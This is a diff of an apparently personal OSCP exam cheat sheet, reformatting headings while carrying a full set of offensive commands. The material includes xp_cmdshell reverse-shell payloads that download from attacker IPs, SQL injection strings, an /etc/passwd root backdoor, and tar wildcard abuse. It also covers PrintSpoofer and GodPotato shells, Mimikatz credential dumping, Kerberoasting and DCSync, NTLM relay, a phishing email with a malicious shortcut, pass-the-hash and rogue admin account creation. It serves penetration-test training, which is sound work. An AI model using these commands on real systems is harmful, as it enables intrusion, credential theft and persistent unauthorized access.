 impacket-smbserver smbfolder $(pwd) -smb2support -user kali -password kali
-    ```
+```
 
     user SMB server within windows machine
-    ```
+```
 $pass = convertto-securestring 'kali' -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential('kali', $pass)
 New-PSDrive -Name kali -PSProvider FileSystem -Credential $cred -Root \\192.168.45.245\smbfolder
@@ -867,52 +867,52 @@ cd kali:
 copy kali:\PrintSpoofer64.exe C:\TEMP
 copy kali:\ncat.exe C:\TEMP
 copy kali:\SharpHound.exe C:\TEMP
-    ```
+```
     
-*** Automated tools
+### Automated tools
    winPEASx64
    https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
 
    Issue with latest build of missing DLL. To fix use this release
    https://github.com/carlospolop/PEASS-ng/releases/tag/20230423-4d9bddc5
    
-   ```
+```
 iwr -uri http://192.168.45.159:1337/winpeas64.exe -Outfile winpeas64.exe
 ./winPEASx64.exe
-   ```
+```
 
    ----
    
    PrivescCheck
    https://github.com/itm4n/PrivescCheck
-   ```
+```
 iwr -uri http://192.168.45.159:1337/privesccheck.ps1 -Outfile privesccheck.ps1
 . .\privesccheck.ps1
 Invoke-PrivescCheck -Extended -Report "privesccheck_$($env:COMPUTERNAME)"
-   ```
+```
 
-** Windows AD
+## Windows AD
 
    List all currently joined machine in the AD
    
-   ```
+```
 Get-ADComputer -Filter * -Properties Name -Server "oscp.exam"
 Get-ADComputer -Filter * -Properties ipv4Address, OperatingSystem, OperatingSystemServicePack | Format-List name, ipv4*, oper*
-   ```
+```
 
    --------------------
 
    *CrackMapExec*
 
    Enumerate smb, winrm, rdp and ssh through crackmapexec, with password and hashes
-   ```
+```
 proxychains crackmapexec smb IP1 IP2 -u USERNAME -p PASSWORD --shares
 proxychains crackmapexec winrm IP1 IP2 -u USERNAME -p PASSWORD --continue-on-success 
 proxychains crackmapexec rdp IP1 IP2 -u USERNAME -p PASSWORD
 proxychains crackmapexec ssh IP1 IP2 -u USERNAME -p PASSWORD
 
 proxychains crackmapexec smb IP1 IP2 -u USERNAME -H NTLM-HAHSH --shares
-   ```
+```
    
    --------------------
 
@@ -920,21 +920,21 @@ proxychains crackmapexec smb IP1 IP2 -u USERNAME -H NTLM-HAHSH --shares
 
    transfer sharphound into the remote machine, collect data and
    transfer data back to attacker machine
-   ```
+```
 iwr -uri http://192.168.45.159:1337/SharpHound.exe -Outfile SharpHound.exe
 ./SharpHound.exe --CollectionMethods All
-   ```
+```
 
    start neo4j. Default creds are ~neo4j:admin~
-   ```
+```
 sudo /usr/bin/neo4j console
 http://localhost:7474/browser/
-   ```
+```
    
    launch bloodhound
-   ```
+```
 ./BloodHound --no-sandbox
-   ```
+```
    
    --------------------
 Powerup
@@ -947,7 +947,7 @@ PS C:\Users\dave> Get-UnquotedService
 PS C:\Users\dave> Get-ModifiableServiceFile
 PS C:\Tools> Get-NetComputer | select operatingsystem,dnshostname
 PS C:\Tools> Find-DomainShare
- ```
+```
    *PowerView*
 ```
 Import-Module .\PowerView.ps1
@@ -957,46 +957,46 @@ PS C:\Tools> Get-NetUser | select cn,pwdlastset,lastlogon
 PS C:\Tools> Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
 PS C:\Tools> Get-NetGroup "Management Department" | select member
 PS C:\Tools> Get-ObjectAcl -Identity stephanie
- ```
+```
   
    
-* Exploitation
+# Exploitation
 
-** Web
-*** SQLi
+## Web
+### SQLi
     Basic SQLi
-    ```
+```
 ' OR 1=1 -- 
-    ```
+```
 
     XP_CMDSHELL in mssql
-    ```
+```
 EXEC sp_configure 'show advanced options', 1;
 RECONFIGURE;
 EXEC sp_configure 'xp_cmdshell', 1;
 RECONFIGURE;
 ' ; EXEC xp_cmdshell 'powershell -c "iex(new-object net.webclient).downloadstring(\"http://192.168.45.248:1337/Invoke-PowerShellTcp.ps1\")" '; --
-    ```
+```
 
     Union select
-    ```
+```
 username=' UNION SELECT 'nurhodelta','password','c','d','f','a','a' -- &password=password&login=
-    ```
+```
     
-** Linux
+## Linux
    Add root user to passwd file (root2:w00t)
-   ```
+```
 echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
-   ```
+```
 
    Abuse tar wildcard ~tar -zxf /tmp/backup.tar.gz *~
-   ```
+```
 echo "python3 /tmp/rev.py" > demo.sh
 touch -- "--checkpoint-action=exec=sh demo.sh"
 touch -- "--checkpoint=1"
-   ```
+```
   
-** Windows
+## Windows
    TODO: 
    https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a
    https://github.com/r3motecontrol/Ghostpack-CompiledBinaries
@@ -1005,11 +1005,11 @@ touch -- "--checkpoint=1"
    ---------------
    
    three steps to get reverse shell using unreliable exploit
-   ```
+```
 payload_1 = f'cmd.exe /c mkdir C:\TEMP'.encode('utf-8')
 payload_3 = f'powershell -c "iwr -uri http://192.168.45.215/shell.exe -Outfile C:\TEMP\shell.exe"'.encode('utf-8')
 payload_4 = f'cmd.exe /c "C:\TEMP\shell.exe"'.encode('utf-8')
-   ```
+```
 
    ---------------
    
@@ -1017,65 +1017,65 @@ payload_4 = f'cmd.exe /c "C:\TEMP\shell.exe"'.encode('utf-8')
 
    First we enable xp_cmdshell
 
-   ```
+```
 EXEC sp_configure 'show advanced options', 1;
 RECONFIGURE;
 EXEC sp_configure 'xp_cmdshell', 1;
 RECONFIGURE;
-   ```
+```
 
    and then we can execute our code
 
-   ```
+```
 EXEC xp_cmdshell 'whoami';
-   ```
+```
 
    to get a reverse shell execute
    
-   ```
+```
 ' ; EXEC xp_cmdshell 'powershell -c "iex(new-object net.webclient).downloadstring(\"http://192.168.45.248:1337/Invoke-PowerShellTcp.ps1\")" '; --
-   ```
+```
 
    ---------------
    
    Exploit ~SeImpersonatePriv~
-   ```
+```
 .\PrintSpoofer64.exe -c "C:\TEMP\nc.exe 192.168.45.235 5555 -e cmd"
 .\PrintSpoofer64.exe -i -c powershell.exe
 .\GodPotato.exe -cmd "cmd /c whoami"
-   ```
+```
     
-   ```
+```
 ./GodPotato-NET2.exe -cmd "C:\TEMP\ncat.exe 192.168.45.235 5555 -e cmd"
 ./GodPotato-NET4.exe -cmd "C:\TEMP\ncat.exe 192.168.45.235 5555 -e cmd"
 ./GodPotato-NET35.exe -cmd "C:\TEMP\ncat.exe 192.168.45.235 5555 -e cmd"n
-   ```
+```
 
    ---------------
 
    Dumping logon passwords with mimikatz
     
-   ```
+```
 .\mimikatz64.exe "privilege::debug" "sekurlsa::logonPasswords full" "exit"
 .\mimikatz.exe "privilege::debug" "token::elevate" "log" "sekurlsa::logonpasswords" "exit"
 .\mimikatz.exe "privilege::debug" "token::elevate" "log" "lsadump::sam" "exit"
-   ```
+```
 
    Dumping LSA with mimikatz
-   ```
+```
 reg save hklm\sam sam.hiv
 reg save hklm\security security.hiv
 reg save hklm\system system.hiv
 impacket-secretsdump -sam sam.hive -system system.hive LOCAL -> to decrypt
 .\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam sam.hiv security.hiv system.hiv" "exit"
-   ```
-   ```
+```
+```
 .\mimikatz.exe "lsadump::sam /system:C:\TEMP\SYSTEM /sam:C:\TEMP\SAM" "exit"
 .\mimikatz.exe "lsadump::sam sam.hiv security.hiv system.hiv" "exit"
-   ```
+```
 ntds.dit 
 Create file
- ```
+```
 nano raj.dsh
 set context persistent nowriters
 add volume c: alias raj
@@ -1102,9 +1102,9 @@ impacket-secretsdump -ntds ntds.dit -system system local
     
    Change user. Requires GUI, such as a RDP session.
 
-   ```
+```
 runas /user:backupadmin cmd
-   ```
+```
    
     
    ---------------
@@ -1112,7 +1112,7 @@ runas /user:backupadmin cmd
    Cross-Compilation for malicious exe
     
    Cross compile for windows
-   ```c
+   #+begin_src c
 #include <stdlib.h>
 
 int main ()
@@ -1122,17 +1122,17 @@ int main ()
   return 0;
 }
 
-  ```
+   #+end_src
 
-   ```
+```
    x86_64-w64-mingw32-gcc exploit.c -o exploit.exe
-   ```
+```
 
    ---------------
 
    Cross-Compilation for malicious DLL
 
-   ```c
+   #+begin_src c
 #include <stdlib.h>
 #include <windows.h>
 
@@ -1157,17 +1157,17 @@ BOOL APIENTRY DllMain(
     }
   return TRUE;
 }
-  ```
+   #+end_src
 
-   ```
+```
 x86_64-w64-mingw32-gcc adduser_dll.c --shared -o adduser.dll  
-   ```
+```
 
    ----------------------
 
-** Windows AD
+## Windows AD
 
-*** Bruteforcing kerberos - Kerbrute
+### Bruteforcing kerberos - Kerbrute
     https://github.com/ropnop/kerbrute
 
   
@@ -1175,52 +1175,52 @@ bruteuser
 Bruteforce a single user's password from a wordlist.
 ```
 ./kerbrute bruteuser -d <domain> <wordlist> <user>
-  ```
+```
 
 bruteforce
 Bruteforce username:password combos from a file or stdin.
-  ```
+```
 ./kerbrute bruteforce -d <domain> <combo_file>
-  ```
+```
 passwordspray
 Test a single password against a list of users.
-  ```
+```
 ./kerbrute passwordspray -d <domain> <user_list> <password>
 ```
 
 userenum
 Enumerate valid domain usernames via Kerberos.
- ```
+```
 ./kerbrute userenum -d <domain> <user_list>
 ```
 Common Flags
- ```
+```
 --dc <domain_controller>: Specify the Domain Controller (KDC).
 -d <domain>: Set the target domain (e.g., example.com).
 -t <threads>: Number of threads to use (default: 10).
 -o <file>: Output log file.
 --safe: Safe mode (abort if accounts lock out).
 -v: Verbose logging (log failures).
-   ```
-*** Kerberoasting
+```
+### Kerberoasting
     through socks proxy using creds of web_svc 
 
-    ```
+```
 proxychains impacket-GetUserSPNs -request -dc-ip 10.10.132.146 oscp.exam/web_svc
-    ```
+```
 
     can also be done with rubeus
     https://github.com/GhostPack/Rubeus
 
-    ```
+```
 .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
-    ```
+```
 
     then crack with
 
-    ```
+```
 sudo hashcat -m 13100 hashes.kerberoast rockyou.txt -r best64.rule --force
-    ```
+```
 
     -----------------------
 
@@ -1233,22 +1233,22 @@ sudo hashcat -m 13100 hashes.kerberoast rockyou.txt -r best64.rule --force
 
     - remove the assigned SPN.
 
-*** AS-REP roasting
-    ```
+### AS-REP roasting
+```
 proxychains impacket-GetNPUsers -dc-ip 192.168.221.70 -request -outputfile hashes corp.com/pete
-    ```
+```
 
     Can also be done with rubeus
 
-    ```
+```
 .\Rubeus.exe asreproast /nowrap
-    ```
+```
 
     then crack with
 
-    ```
+```
 sudo hashcat -m 18200 hashes.asreproast rockyou.txt -r best64.rule --force
-    ```
+```
    
     -------------------
 
@@ -1260,7 +1260,7 @@ sudo hashcat -m 18200 hashes.asreproast rockyou.txt -r best64.rule --force
 
     - Perform typical AS-REP roasting.
 
-*** DCsync attack
+### DCsync attack
     To launch a DSsync attac, a user needs to have the following
     privileges:
 
@@ -1273,19 +1273,19 @@ sudo hashcat -m 18200 hashes.asreproast rockyou.txt -r best64.rule --force
     
     Using mimikatz, provide the user for which we want to obtain creds
 
-    ```
+```
 lsadump::dcsync /user:corp\dave
 lsadump::dcsync /user:corp\Administrator
-    ```
+```
 
     using impacket-secretsdump. 
 
-    ```
+```
 impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"password"@192.168.50.70
 impacket-secretsdump -sam sam.hive -system system.hive LOCAL -> 
-    ```
+```
     
-*** Silver tickets
+### Silver tickets
     With the service account password or its associated NTLM hash at
     hand, we can forge our own service ticket to access the target
     resource (in our example, the IIS application) with any
@@ -1304,44 +1304,44 @@ impacket-secretsdump -sam sam.hive -system system.hive LOCAL ->
     To get the password hash of the SPN we can use a tool like
     mimikatz. To get the domain SID we can do ~whoami /user~
 
-    ```
+```
 corp\jeff S-1-5-21-1987370270-658905905-1781884369-1105
-    ```
+```
 
     and to get the SPN we can enumerate SPN using ~impacket-GetUserSPNs~.
     
     With all of this info, we can forge a TGS (silver ticket) as
     follows within mimikatz
 
-    ```
+```
 kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:5d28cf5252d32971419580a51484ca09 /user:geffadmin
-    ```
+```
     
-*** Responder Net-NTLMv2 capture
+### Responder Net-NTLMv2 capture
     Obtain NTLM hashes of accounts by exploiting the Net-NTLMv2
     protocol. This is useful when we do not have the privileges to run
     mimikatz and dump NTLM hashes.
 
     - First we set up a fake SMB server
 
-      ```
+```
  sudo responder -I tun0
-      ```
+```
 
     - Then we force the connection from the remote target using a
       compromised account of which we do not know the NTLM hash
 
-      ```
+```
  dir \\192.168.45.159\test
-      ```
+```
 
     - Finally crack the hash with hashcat or john
 
-      ```
+```
  hashcat -m 5600 paul.hash rockyou.txt
-      ```
+```
 
-*** Net-NTLM relaying
+### Net-NTLM relaying
     The idea now is to relay an NTLM info to another windows
     service. We can do this when we gain access to a user account in a
     machine, and we want to use its NTLM hash in another machine. If
@@ -1355,26 +1355,26 @@ kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com 
     is for the command to execute. In this case we're executing a
     powershell reverse shell that was encoded in base64.
 
-    ```
+```
 impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."
-    ```
+```
    
-*** GPP (Group Policy Preferences)
+### GPP (Group Policy Preferences)
     Say you have the following
 
     *Groups.xml*
 
-    ```xml
+    #+begin_src xml
 <?xml version="1.0" encoding="utf-8"?>
 <Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
 </Groups>
-   ```
+    #+end_src
 
     We can crack the ~cpassword~ with the following python script
 
     *ggp-decrypt.py*
 
-    ```python
+    #+begin_src python
 #!/usr/bin/env python3
 
 from Crypto.Cipher import AES
@@ -1393,36 +1393,36 @@ if __name__ == "__main__":
     plaintext = unpad(plaintext, AES.block_size)
 
     print(plaintext.decode())
-   ```
+    #+end_src
 
     To use the script do the following
 
-    ```bash
+    #+begin_src bash
 python3 -m venv venv
 . venv/bin/activate
 pip3 install pycryptodome
 python3 gpp-decrypt.py
-   ```
+    #+end_src
     
     The key was obtained directly from Microsoft. References:
 
     - https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN
     - https://adsecurity.org/?p=2288
 
-** Client-Side
-*** Email phishing attack
+## Client-Side
+### Email phishing attack
     First we install and enable our ~webdav~ server
 
-    ```
+```
 pip3 install wsgidav
 pip3 install cheroot
 sudo wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root webdav/
-    ```
+```
 
     Then we create a ~config.Library.ms~ file with the following
     content. Notice the IP address.
 
-    ```
+```
 <?xml version="1.0" encoding="UTF-8"?>
 <libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
 <name>@windows.storage.dll,-34582</name>
@@ -1442,65 +1442,65 @@ sudo wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root webdav/
 </searchConnectorDescription>
 </searchConnectorDescriptionList>
 </libraryDescription>
-    ```
+```
 
     We craft a malicious ~powershell.lnk~ that contains our powershell
     payload. This step has to be done in a windows VM.
 
-    ```
+```
 powershell -c "iex(new-object net.webclient).downloadstring('http://192.168.45.239:1337/Invoke-PowerShellTcp.ps1')"
-    ```
+```
 
     and we send a malicious ~body.txt~
 
-    ```
+```
 Hi,
 
  please click on the attachment :D
-    ```
+```
     
     using ~smtp~ with ~swaks~
 
-    ```
+```
 swaks -t jim@relia.com --from test@relia.com --attach @config.Library-ms --server 192.168.186.189 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
-    ```
+```
     
-* Post-Exploitation / Lateral Movement
+# Post-Exploitation / Lateral Movement
   Here mainly stuff on windows AD, after we root a machine all the
   steps we need to take to proceed further and extract all data for
   the next machine until we get to the domain user.
 
-** Linux
+## Linux
    Install cronjob to spawn reverse shell every minute at my IP
 
    TODO
 
-** Windows
+## Windows
    
-*** chisel and internal enumeration
+### chisel and internal enumeration
 
     setup chisel tunnel
-    ```
+```
 certutil -urlcache -split -f "http://192.168.45.170:1337/chisel64.exe" chisel64.exe
 (local kali)    ./chisel server -p 8000 --reverse         
 (remote window) chisel64.exe client 192.168.45.217:8000 R:socks 
-    ```
+```
 
     enumerate ports
-    ```
+```
 proxychains nmap -sT --top-ports=100 -Pn <IP>
-    ```
+```
 
     enumerate services
-    ```
+```
 proxychains crackmapexec smb IP1 IP2 -u USERNAME -p PASSWORD --shares
 proxychains crackmapexec winrm IP1 IP2 -u USERNAME -p PASSWORD
 proxychains crackmapexec rdp IP1 IP2 -u USERNAME -p PASSWORD
 proxychains crackmapexec ssh IP1 IP2 -u USERNAME -p PASSWORD
 proxychains crackmapexec smb IP1 IP2 -u USERNAME -H NTLM-HAHSH --shares
-    ```
+```
     
-*** PsExec
+### PsExec
     To use this tool we need:
 
     - user that authenticates to the target machine needs to be a part
@@ -1515,34 +1515,34 @@ proxychains crackmapexec smb IP1 IP2 -u USERNAME -H NTLM-HAHSH --shares
 
     There are different ways to exploit this.
     
-**** Pass the NTLM hash of admin
+#### Pass the NTLM hash of admin
      1. First we dump password with mimikatz
 
-      ```
+```
  .\mimikatz.exe "privilege::debug" "token::elevate" "lsadump:sam"
-      ```
+```
 
      2. Then we use the hash with psexec. Notice the format
 	"LMHash:NTHash", where LMHash is set to 0 because we do not use it.
 
-	```
+```
    impacket-psexec -hashes 00000000000000000000000000000000:7a39311ea6f0027aa955abed1762964b Administrator@192.168.50.212
-	```
+```
 
      3. Another way is to also use ~wmiexec~
 
-	```
+```
    impacket-wmiexec -hashes 00000000000000000000000000000000:7a32350ea6f0028ff955abed1762964b Administrator@192.168.50.212
-	```
+```
 
-**** Using impacket-psexec
-     ```bash
+#### Using impacket-psexec
+     #+begin_src bash
 impacket-psexec active.htb/administrator@10.10.10.100                                    
-    ```
+     #+end_src
 
      Example execution
 
-     ```
+```
 impacket-psexec active.htb/administrator@10.10.10.100
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
@@ -1559,14 +1559,14 @@ Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 
 C:\Windows\system32> whoami
 nt authority\system
-     ```
+```
      
-*** WMI, winRM and evil-winrm
+### WMI, winRM and evil-winrm
     First with WMI (Windows Management Instrumentation), using
     powershell. The reverse shell here was generated based on the code
     found in [[Reverse Shells]].
     
-    ```
+```
 $username = 'jen';
 $password = 'password';
 $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
@@ -1578,7 +1578,7 @@ $Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8
 HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA';
 
 Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
-    ```
+```
 
     --------------
 
@@ -1589,22 +1589,22 @@ Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Creat
     needs to be part of the Administrators or Remote Management Users
     group on the target host.
 
-    ```
+```
 winrs -r:files04 -u:jen -p:passworddd  "cmd /c hostname & whoami"
-    ```
+```
 
     To spawn a shell simply do
 
-    ```
+```
 winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
 HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
-    ```
+```
 
     ----
 
     We can also use powershell via the ~New-PSSession~ cmdlet
 
-    ```
+```
 $username = 'jen';
 $password = 'password';
 $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
@@ -1613,21 +1613,21 @@ $credential = New-Object System.Management.Automation.PSCredential $username, $s
 New-PSSession -ComputerName 192.168.50.73 -Credential $credential
 
 Enter-PSSession 1
-    ```
+```
 
     ----
 
     Finally, we can use evil-winrm, which can be used either with the password (~-p~) or with the hash (~-H~)
 
-    ```
+```
 proxychains evil-winrm -i 192.168.243.153 -u administrator -p Password
 proxychains evil-winrm -i 10.10.132.146 -u admin -H 4979f29d4cb99845c075c41cf45f24df
-    ```
+```
 
-*** RDP
+### RDP
     
     Set up RDP by enabling RDP and adding administrator to RDP group
-    ```
+```
 %SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe
 
 # change admin password
@@ -1644,18 +1644,18 @@ net localgroup "Remote Desktop Users" "Administrator" /add
 
 # connect to rdp
 xfreerdp  /u:Administrator /p:"test!" /v:192.168.236.121 
-    ```
+```
 
     Set up RDP by creating a new user for RDP   
-    ```
+```
 $password = ConvertTo-SecureString "test!" -AsPlainText -Force
 New-LocalUser "test" -Password $password -FullName "test" -Description "test"
 Add-LocalGroupMember -Group "Administrators" -Member "test"
 net localgroup "Remote Desktop Users" "test" /add
-    ```
+```
 
     Enabled RDP remotely (first we open the port and configure the server, then we create a new user)
-    ```
+```
 Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
 Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
 Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
@@ -1664,9 +1664,9 @@ $password = ConvertTo-SecureString "vau!XCKjNQBv3$" -AsPlainText -Force
 New-LocalUser "test" -Password $password -FullName "test" -Description "test"
 Add-LocalGroupMember -Group "Administrators" -Member "test"
 net localgroup "Remote Desktop Users" "test" /add
-    ```  
+```
     
-*** pass the hash
+### pass the hash
     This technique requires an SMB connection through the firewall
     (commonly port 445) and the Windows File and Printer Sharing
     feature to be enabled.  This lateral movement technique also
@@ -1686,29 +1686,29 @@ net localgroup "Remote Desktop Users" "test" /add
 
     - *crackmapexec*
 
-      ```
+```
 crackmapexec smb 192.168.242.147 -u web_svc -H 820d6348890293116990101307197053
-      ```
+```
 
     - *evil-winrm*
 
-      ```
+```
 proxychains evil-winrm -i 192.168.243.153 -u administrator -p Password
-      ```
+```
 
     - *impacket-psexec*
 
-      ```
+```
  impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0038ee955abed1762964b Administrator@192.168.50.212
-      ```
+```
 
     - *impacket-wmiexec*
 
-      ```
+```
  impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0038ee955abed1762964b Administrator@192.168.50.212
-      ```
+```
     
-*** overpass the hash
+### overpass the hash
     With *overpass the hash*, we can "over" abuse an NTLM user hash to
     gain a full Kerberos Ticket Granting Ticket (TGT). Then we can use
     the TGT to obtain a Ticket Granting Service (TGS).
@@ -1717,9 +1717,9 @@ proxychains evil-winrm -i 192.168.243.153 -u administrator -p Password
     the use of NTLM authentication. A simple way to do this is with
     the *sekurlsa::pth* command from Mimikatz.
 
-    ```
+```
 sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372419bf6e93364cc93075 /run:powershell
-    ```
+```
 
     At this point, we have a new PowerShell session that allows us to
     execute commands as jen. We can then access various services and
@@ -1728,7 +1728,7 @@ sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372419bf6e93364cc93075 
     various tools, such as the official PsExec application from
     microsoft, which does not accept password hashes.
     
-*** pass the ticket
+### pass the ticket
     The Pass the Ticket attack takes advantage of the TGS, which may
     be exported and re-injected elsewhere on the network and then used
     to authenticate to a specific service. If the service tickets
@@ -1740,32 +1740,32 @@ sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372419bf6e93364cc93075 
     parses the LSASS process space in memory in order to look for any
     TGT/TGS, which are saved to disk in the kirbi mimikatz format.
     
-    ```
+```
 PS C:\Windows\system32> whoami
 corp\jen
-    ```
+```
 
-    ```
+```
 mimikatz # privilege::debug
 ...
 mimikatz # sekurlsa::tickets /export
-    ```
+```
 
     We can then pick any ticket and inject it through mimikatz via the
     ~kerberos::ptt~ command
 
-    ```
+```
 kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
-    ```
+```
 
     and now we can run ~klist~ in order to print the current available tickets
 
-    ```
+```
 klist
-    ```
+```
     
-*** TODO DCOM
-*** TODO Golden ticket
+### TODO DCOM
+### TODO Golden ticket
 ```
 
 .\mimikatz.exe "privilege::debug" "token::elevate" "log" "lsadump::lsa /inject /name:krbtgt" "exit" -> to gain krbgt hash in format -aes-key
@@ -1797,5 +1797,5 @@ Lastly, try again with psexec:
 impacket-psexec 'sub.corp.yzx/administrator@dc01.corp.yzx' -k -no-pas
 ```
     
-* Reporting
+# Reporting
   https://github.com/noraj/OSCP-Exam-Report-Template-Markdown
